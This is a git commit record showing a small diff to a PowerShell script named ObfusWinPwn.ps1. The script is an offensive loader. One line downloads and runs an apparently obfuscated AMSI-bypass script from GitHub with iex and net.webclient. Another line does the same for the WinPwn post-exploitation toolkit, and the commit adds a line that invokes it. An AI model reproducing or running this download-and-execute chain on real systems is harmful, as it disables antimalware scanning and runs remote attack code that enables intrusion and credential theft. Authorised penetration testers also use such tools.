fa011b4a5871ffc2a8844b22c015542902c84b69
SecureThisShit <27858067+SecureThisShit@users.noreply.github.com>
2019-05-22 13:39:56 +0200

    Update ObfusWinPwn.ps1

--- ObfusWinPwn.ps1
+++ ObfusWinPwn.ps1
@@ -1,2 +1,3 @@
 iex (new-object net.webclient).downloadstring('https://raw.githubusercontent.com/SecureThisShit/Creds/master/obfuscatedps/amsi.ps1')
 iex (new-object net.webclient).downloadstring('https://raw.githubusercontent.com/SecureThisShit/WinPwn/master/WinPwn.ps1')
+WinPwn
